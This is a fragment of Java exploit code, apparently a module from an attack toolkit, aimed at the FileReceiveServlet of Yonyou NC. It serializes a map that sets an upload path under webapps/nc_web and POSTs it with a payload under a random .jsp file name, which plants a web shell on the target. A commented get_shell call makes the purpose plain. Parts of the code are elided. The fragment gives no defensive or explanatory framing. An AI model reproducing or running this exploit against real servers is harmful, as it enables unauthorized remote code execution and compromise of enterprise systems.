...
public class yongyou_nc_FileReceiveServlet_upload implements Exploitlnterface {
    @Override
...
//        return get_shell(url,textArea);
    ...
    public static String target_url(String url, String payload) {
        try {
            ...
            String filename = "R4GT"+t.substring(10,12)+".jsp";
            ...
            hm.put("TARGET_FILE_PATH", "./webapps/nc_web");
            oos.writeObject(hm);
            HttpTools.post_byte(url+"/servlet/FileReceiveServlet", byteMerger(bo.toByteArray(), payload.getBytes()),head,"utf-8");
//            (new utils.HttpURLHttp()).post(url + "/servlet/FileReceiveServlet", byteMerger(bo.toByteArray(), payload.getBytes()), new byte[][]{"Content-Type: multipart/form-data;".getBytes()});
